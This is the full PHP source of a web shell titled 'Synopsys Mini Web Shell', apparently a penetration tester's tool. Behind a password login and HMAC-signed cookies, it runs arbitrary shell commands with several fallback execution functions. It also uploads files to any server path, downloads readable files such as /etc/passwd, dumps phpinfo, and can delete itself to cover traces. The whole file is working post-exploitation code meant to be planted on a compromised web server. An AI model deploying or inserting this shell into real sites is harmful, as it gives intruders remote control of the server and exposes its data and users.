<?php
error_reporting(0);
ob_start(); ?>
<!DOCTYPE html>
<html>
<head>
    <title>Synopsys Mini Web Shell</title>
    <!-- this is the smallest footprint CSS boilerplate I could find -->
    <style>
    /*! * Milligram v1.3.0 * https://milligram.github.io * * Copyright (c) 2017 CJ Patoilo * Licensed under the MIT license */
    *,*:after,*:before{box-sizing:inherit}html{box-sizing:border-box;font-size:62.5%}body{color:#606c76;font-family:'Roboto', 'Helvetica Neue', 'Helvetica', 'Arial', sans-serif;font-size:1.6em;font-weight:300;letter-spacing:.01em;line-height:1.6}blockquote{border-left:0.3rem solid #d1d1d1;margin-left:0;margin-right:0;padding:1rem 1.5rem}blockquote *:last-child{margin-bottom:0}.button,button,input[type='button'],input[type='reset'],input[type='submit']{background-color:#9b4dca;border:0.1rem solid #9b4dca;border-radius:.4rem;color:#fff;cursor:pointer;display:inline-block;font-size:1.1rem;font-weight:700;height:3.8rem;letter-spacing:.1rem;line-height:3.8rem;padding:0 3.0rem;text-align:center;text-decoration:none;text-transform:uppercase;white-space:nowrap}.button:focus,.button:hover,button:focus,button:hover,input[type='button']:focus,input[type='button']:hover,input[type='reset']:focus,input[type='reset']:hover,input[type='submit']:focus,input[type='submit']:hover{background-color:#606c76;border-color:#606c76;color:#fff;outline:0}.button[disabled],button[disabled],input[type='button'][disabled],input[type='reset'][disabled],input[type='submit'][disabled]{cursor:default;opacity:.5}.button[disabled]:focus,.button[disabled]:hover,button[disabled]:focus,button[disabled]:hover,input[type='button'][disabled]:focus,input[type='button'][disabled]:hover,input[type='reset'][disabled]:focus,input[type='reset'][disabled]:hover,input[type='submit'][disabled]:focus,input[type='submit'][disabled]:hover{background-color:#9b4dca;border-color:#9b4dca}.button.button-outline,button.button-outline,input[type='button'].button-outline,input[type='reset'].button-outline,input[type='submit'].button-outline{background-color:transparent;color:#9b4dca}.button.button-outline:focus,.button.button-outline:hover,button.button-outline:focus,button.button-outline:hover,input[type='button'].button-outline:focus,input[type='button'].button-outline:hover,input[type='reset'].button-outline:focus,input[type='reset'].button-outline:hover,input[type='submit'].button-outline:focus,input[type='submit'].button-outline:hover{background-color:transparent;border-color:#606c76;color:#606c76}.button.button-outline[disabled]:focus,.button.button-outline[disabled]:hover,button.button-outline[disabled]:focus,button.button-outline[disabled]:hover,input[type='button'].button-outline[disabled]:focus,input[type='button'].button-outline[disabled]:hover,input[type='reset'].button-outline[disabled]:focus,input[type='reset'].button-outline[disabled]:hover,input[type='submit'].button-outline[disabled]:focus,input[type='submit'].button-outline[disabled]:hover{border-color:inherit;color:#9b4dca}.button.button-clear,button.button-clear,input[type='button'].button-clear,input[type='reset'].button-clear,input[type='submit'].button-clear{background-color:transparent;border-color:transparent;color:#9b4dca}.button.button-clear:focus,.button.button-clear:hover,button.button-clear:focus,button.button-clear:hover,input[type='button'].button-clear:focus,input[type='button'].button-clear:hover,input[type='reset'].button-clear:focus,input[type='reset'].button-clear:hover,input[type='submit'].button-clear:focus,input[type='submit'].button-clear:hover{background-color:transparent;border-color:transparent;color:#606c76}.button.button-clear[disabled]:focus,.button.button-clear[disabled]:hover,button.button-clear[disabled]:focus,button.button-clear[disabled]:hover,input[type='button'].button-clear[disabled]:focus,input[type='button'].button-clear[disabled]:hover,input[type='reset'].button-clear[disabled]:focus,input[type='reset'].button-clear[disabled]:hover,input[type='submit'].button-clear[disabled]:focus,input[type='submit'].button-clear[disabled]:hover{color:#9b4dca}code{background:#f4f5f6;border-radius:.4rem;font-size:86%;margin:0 .2rem;padding:.2rem .5rem;white-space:nowrap}pre{background:#f4f5f6;border-left:0.3rem solid #9b4dca;overflow-y:hidden}pre>code{border-radius:0;display:block;padding:1rem 1.5rem;white-space:pre}hr{border:0;border-top:0.1rem solid #f4f5f6;margin:3.0rem 0}input[type='email'],input[type='number'],input[type='password'],input[type='search'],input[type='tel'],input[type='text'],input[type='url'],textarea,select{-webkit-appearance:none;-moz-appearance:none;appearance:none;background-color:transparent;border:0.1rem solid #d1d1d1;border-radius:.4rem;box-shadow:none;box-sizing:inherit;height:3.8rem;padding:.6rem 1.0rem;width:100%}input[type='email']:focus,input[type='number']:focus,input[type='password']:focus,input[type='search']:focus,input[type='tel']:focus,input[type='text']:focus,input[type='url']:focus,textarea:focus,select:focus{border-color:#9b4dca;outline:0}select{background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" height="14" viewBox="0 0 29 14" width="29"><path fill="#d1d1d1" d="M9.37727 3.625l5.08154 6.93523L19.54036 3.625"/></svg>') center right no-repeat;padding-right:3.0rem}select:focus{background-image:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" height="14" viewBox="0 0 29 14" width="29"><path fill="#9b4dca" d="M9.37727 3.625l5.08154 6.93523L19.54036 3.625"/></svg>')}textarea{min-height:6.5rem}label,legend{display:block;font-size:1.6rem;font-weight:700;margin-bottom:.5rem}fieldset{border-width:0;padding:0}input[type='checkbox'],input[type='radio']{display:inline}.label-inline{display:inline-block;font-weight:normal;margin-left:.5rem}.container{margin:0 auto;max-width:112.0rem;padding:0 2.0rem;position:relative;width:100%}.row{display:flex;flex-direction:column;padding:0;width:100%}.row.row-no-padding{padding:0}.row.row-no-padding>.column{padding:0}.row.row-wrap{flex-wrap:wrap}.row.row-top{align-items:flex-start}.row.row-bottom{align-items:flex-end}.row.row-center{align-items:center}.row.row-stretch{align-items:stretch}.row.row-baseline{align-items:baseline}.row .column{display:block;flex:1 1 auto;margin-left:0;max-width:100%;width:100%}.row .column.column-offset-10{margin-left:10%}.row .column.column-offset-20{margin-left:20%}.row .column.column-offset-25{margin-left:25%}.row .column.column-offset-33,.row .column.column-offset-34{margin-left:33.3333%}.row .column.column-offset-50{margin-left:50%}.row .column.column-offset-66,.row .column.column-offset-67{margin-left:66.6666%}.row .column.column-offset-75{margin-left:75%}.row .column.column-offset-80{margin-left:80%}.row .column.column-offset-90{margin-left:90%}.row .column.column-10{flex:0 0 10%;max-width:10%}.row .column.column-20{flex:0 0 20%;max-width:20%}.row .column.column-25{flex:0 0 25%;max-width:25%}.row .column.column-33,.row .column.column-34{flex:0 0 33.3333%;max-width:33.3333%}.row .column.column-40{flex:0 0 40%;max-width:40%}.row .column.column-50{flex:0 0 50%;max-width:50%}.row .column.column-60{flex:0 0 60%;max-width:60%}.row .column.column-66,.row .column.column-67{flex:0 0 66.6666%;max-width:66.6666%}.row .column.column-75{flex:0 0 75%;max-width:75%}.row .column.column-80{flex:0 0 80%;max-width:80%}.row .column.column-90{flex:0 0 90%;max-width:90%}.row .column .column-top{align-self:flex-start}.row .column .column-bottom{align-self:flex-end}.row .column .column-center{-ms-grid-row-align:center;align-self:center}@media (min-width: 40rem){.row{flex-direction:row;margin-left:-1.0rem;width:calc(100% + 2.0rem)}.row .column{margin-bottom:inherit;padding:0 1.0rem}}a{color:#9b4dca;text-decoration:none}a:focus,a:hover{color:#606c76}dl,ol,ul{list-style:none;margin-top:0;padding-left:0}dl dl,dl ol,dl ul,ol dl,ol ol,ol ul,ul dl,ul ol,ul ul{font-size:90%;margin:1.5rem 0 1.5rem 3.0rem}ol{list-style:decimal inside}ul{list-style:circle inside}.button,button,dd,dt,li{margin-bottom:1.0rem}fieldset,input,select,textarea{margin-bottom:1.5rem}blockquote,dl,figure,form,ol,p,pre,table,ul{margin-bottom:2.5rem}table{border-spacing:0;width:100%}td,th{border-bottom:0.1rem solid #e1e1e1;padding:1.2rem 1.5rem;text-align:left}td:first-child,th:first-child{padding-left:0}td:last-child,th:last-child{padding-right:0}b,strong{font-weight:bold}p{margin-top:0}h1,h2,h3,h4,h5,h6{font-weight:300;letter-spacing:-.1rem;margin-bottom:2.0rem;margin-top:0}h1{font-size:4.6rem;line-height:1.2}h2{font-size:3.6rem;line-height:1.25}h3{font-size:2.8rem;line-height:1.3}h4{font-size:2.2rem;letter-spacing:-.08rem;line-height:1.35}h5{font-size:1.8rem;letter-spacing:-.05rem;line-height:1.5}h6{font-size:1.6rem;letter-spacing:0;line-height:1.4}img{max-width:100%}.clearfix:after{clear:both;content:' ';display:table}.float-left{float:left}.float-right{float:right}
    </style>
    <!-- <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.css"> -->
</head>
<body>
    <div class="container app">{{PAGE_CONTENT}}</div>
</body>
</html>
<?php
define("MAIN_TPL", ob_get_clean());
define("WEBSHELL_SECRET", "ecr`;m(}jvSk|M-}Daq(<Wig[)ni@#D\\");
define("TIMEOUT_MINUTES", 15);
define("PASSWORD_HASH", '$2y$10$BxUhT6snnaqtOfUf/z4o.OWkNw9mQ7BCpua8.ECODCNNZbAIRGj9S');

// auth filter
$authenticated = is_session_valid();
$provided_password = isset($_POST["pw"]) ? $_POST["pw"] : false;

if (!$authenticated && $provided_password) {
    $authenticated = authenticate($provided_password);
}

if (!$authenticated) {
    response_login();
}

// post-authentication
$action = isset($_GET["form_action"]) ? $_GET["form_action"] : false;

switch ($action) {
    case "upload":
        action_upload();
        break;
    case "download":
        action_download();
        break;
    case "exec":
        action_exec();
        break;
    case "phpinfo":
        action_phpinfo();
        break;
    case "logout":
        action_logout();
        break;
    case "self-destruct":
        action_self_destruct();
        break;
    default:
        response_main_page();
        break;
}

// no orphan logic below this line
function authenticate($provided_password)
{
    $result = $provided_password ? password_verify($provided_password, PASSWORD_HASH) : false;
    if (!$result) {
        response_login("Could not successfuly authenticate you.");
    }

    return $result;
}

function touch_session()
{
    $session_timestamp = time();
    $session_signature = hash_hmac("sha256", $session_timestamp, WEBSHELL_SECRET);
    $session = $session_timestamp . ":" . $session_signature;
    // We are not setting flags on purpose so that this webshell can support non-https use cases.
    setcookie("webshell_session", $session, time() + TIMEOUT_MINUTES * 60);
}

function is_session_valid()
{
    // We avoid built-in sessions to avoid depedency on persistent session storage being set up on the server,
    // and to avoid any conflicts with customer applications.
    // Our sessions are based on HMAC and are short-lived.
    $session = isset($_COOKIE["webshell_session"]) ? explode(":", $_COOKIE["webshell_session"]) : false;
    if (!$session || count($session) != 2) {
        return false;
    }
    $session_timestamp = $session[0];
    $session_signature = $session[1];
    if (!$session_timestamp || !$session_signature) {
        return false;
    }
    $signature_valid = hash_equals(hash_hmac("sha256", $session_timestamp, WEBSHELL_SECRET), $session_signature);
    if (!$signature_valid) {
        return false;
    }
    if ((time() - $session_timestamp) > TIMEOUT_MINUTES * 60) {
        return false;
    }

    return true;
}

function output_encode($data)
{
    return htmlentities($data, ENT_QUOTES);
}

function getuser()
{
    $result = runcmd("id");
    if ($result == "") {
        if (function_exists("posix_getuid")) {
            $uid = posix_getuid();
            $pwuid = posix_getpwuid($uid);
            $grgid = posix_getgrgid($pwuid["gid"]);
            $result = "uid=" . $uid . "(" . $pwuid["name"] . ") gid=" . $pwuid["gid"] . "(" . $grgid["name"] . ")";
        } else {
            $result = "could not be retrieved";
        }
    }

    return $result;
}

function runcmd($cmd)
{
    $out = "";

    if (function_exists('shell_exec')) {
        $out = shell_exec($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $out);
        $out = join("\n", $out);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        $out = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $out = ob_get_clean();
    } elseif (is_resource($f = popen($cmd, "r"))) {
           $out = "";
        while (!@feof($f)) {
            $out .= fread($f, 1024);
        }
        pclose($f);
    } else {
        $out = "error: no command execution methods available";
    }

    return $out;
}

function getwd()
{
    $cwd = getcwd();
    return $cwd ? $cwd : "could not be retrieved";
}

function response($code, $page_content, $touch = true)
{
    http_response_code($code);
    // In responses that are not authentication errors we renew the session expiration timestamp
    if ($touch) {
        touch_session();
    }
    echo str_replace("{{PAGE_CONTENT}}", $page_content, MAIN_TPL);
    exit(0);
}

function response_login($message = "")
{
    ob_start();
    ?>
    <div class="row">
        <div class="column">
            <h1>Authentication</h1>
            <?php if ($message) { ?>
                <p><?= $message ?></p>
            <?php } ?>
            <form method="post">
                <fieldset>
                    <label for="pw">Password</label>
                    <input type="password" name="pw">
                    <input type="submit" class="button-primary" value="Login">
                </fieldset>
            </form>
        </div>
    </div>
    <?php
    $page_content = ob_get_clean();
    response(403, $page_content, false);
}

function response_main_page($tpl_vars = [])
{
    $tpl_vars["basic"] = [
        "system" => php_uname('s') . " " . php_uname('r') . " " . php_uname('v'),
        "server" => getenv("SERVER_SOFTWARE"),
        "user"   => getuser(),
        "pwd"    => getwd()
    ];
    ob_start();
    ?>
    <div class="row">
        <div class="column">
            <h1>Synopsys Mini Web Shell</h1>
        </div>
    </div>
    <div class="row menu">
        <div class="column">
            <a href="?form_action=phpinfo" class="button button-outline">phpinfo</a>
            <a href="?form_action=logout" class="button button-outline">logout</a>
            <a href="?form_action=self-destruct" class="button button-outline">self-destruct</a>
        </div>
    </div>
    <div class="row">
        <div class="column app-basic">
            <h2>Basic Information</h2>
            <table>
                <tbody>
                    <tr>
                        <td>System</td>
                        <td><?= $tpl_vars["basic"]["system"] ?></td>
                    </tr>
                    <tr>
                        <td>Server</td>
                        <td><?= $tpl_vars["basic"]["server"] ?></td>
                    </tr>
                    <tr>
                        <td>User</td>
                        <td><?= $tpl_vars["basic"]["user"] ?></td>
                    </tr>
                    <tr>
                        <td>PWD</td>
                        <td><code><?= $tpl_vars["basic"]["pwd"] ?></code></td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
    <?php
    if (isset($tpl_vars["messages"])) {
        foreach ($tpl_vars["messages"] as $message) {
            ?>
            <div class="row message">
                <div class="column">
                    <blockquote>
                        <p><?= $message ?></p>
                    </blockquote>
                </div>
            </div>
            <?php
        }
    }
    ?>
    <div class="row">
        <div class="column app-input">
            <div class="row">
                <div class="column app-exec">
                    <h2>Shell Command</h2>
                    <form method="post" action="?form_action=exec">
                        <fieldset>
                            <input type="text" name="command" placeholder="ls -al .">
                            <input type="submit" class="button-primary" value="execute">
                        </fieldset>
                    </form>
                </div>
            </div>
            <div class="row">
                <div class="column app-upload">
                    <h2>File Upload</h2>
                    <form method="post" enctype="multipart/form-data" action="?form_action=upload">
                        <fieldset>
                            <input type="text" name="upload_path" placeholder="/tmp/test">
                            <input type="file" name="upload_file">
                            <input type="submit" class="button-primary" value="upload">
                        </fieldset>
                    </form>
                </div>
            </div>
            <div class="row">
                <div class="column app-upload">
                    <h2>File Download</h2>
                    <form method="post" action="?form_action=download">
                        <fieldset>
                            <input type="text" name="download_path" placeholder="/etc/passwd">
                            <input type="submit" class="button-primary" value="download">
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
        <div class="column app-output">
            <pre style="height: 100%">
                <code><?php
                if (isset($tpl_vars["command_output"])) {
                    echo output_encode($tpl_vars["command_output"]);
                } else {
                    echo "Command output will be displayed here";
                }
                ?></code>
            </pre>
        </div>
    </div>
    <?php
    $page_content = ob_get_clean();
    response(200, $page_content);
}

function action_exec()
{
    $tpl_vars = [];
    $command = isset($_POST["command"]) ? $_POST["command"] : false;
    if ($command) {
        $tpl_vars["messages"] = ["Ran <code>" . output_encode($command) . "</code>"];
        $tpl_vars["command_output"] = runcmd($command);
    }

    response_main_page($tpl_vars);
}

function action_download()
{
    $download_path = isset($_POST["download_path"]) ? $_POST["download_path"] : false;
    if (is_readable($download_path) && is_file($download_path)) {
        header("Content-Description: File Transfer");
        header("Content-Type: text/plain");
        header("Content-Disposition: attachment; filename=\"" . basename($download_path) . "\"");
        header("Content-Length: " . filesize($download_path));
        readfile($download_path);
        exit(0);
    } else {
        $tpl_vars = ["messages" => ["Error: failed to open <code>" . output_encode($download_path) . "</code> for download."]];
        response_main_page($tpl_vars);
    }
}

function action_upload()
{
    $tpl_vars = [];
    $file_provided = isset($_FILES["upload_file"]) && $_FILES["upload_file"]["error"] == UPLOAD_ERR_OK;
    $upload_path_provided = (isset($_POST["upload_path"]) && $_POST["upload_path"] !== "");

    if ($file_provided) {
        $default_destination = getwd() . "/" . $_FILES["upload_file"]["name"];
        $destination = $upload_path_provided ? $_POST["upload_path"] : $default_destination;
        $success = move_uploaded_file($_FILES["upload_file"]["tmp_name"], $destination);
        if ($success) {
            $tpl_vars["messages"] = ["Uploaded as " . output_encode($destination)];
        } else {
            $tpl_vars["messages"] = [
                "Error: <code>move_uploaded_file(" . output_encode($_FILES["upload_file"]["tmp_name"]) . ", " . output_encode($destination) . ")</code> failed."
            ];
        }
    } else {
        if (isset($_FILES["upload_file"])) {
            $tpl_vars["messages"] = [
                "Could not process the uploaded file: " .
                "<a href=\"https://www.php.net/manual/en/features.file-upload.errors.php\" target=\"_blank\">" .
                $_FILES["upload_file"]["error"] .
                " (click for error code explanation)</a>"
            ];
        } else {
            $tpl_vars["messages"] = ["No file was supplied"];
        }
    }


    response_main_page($tpl_vars);
}

function action_phpinfo()
{
    phpinfo();
    exit(0);
}

function action_logout()
{
    http_response_code(302);
    header("Location: " . $_SERVER["PHP_SELF"]);
    unset($_COOKIE["webshell_session"]);
    setcookie("webshell_session", null, -1);
    exit(0);
}

function action_self_destruct()
{
    unlink(__FILE__);
    action_logout();
}
?>
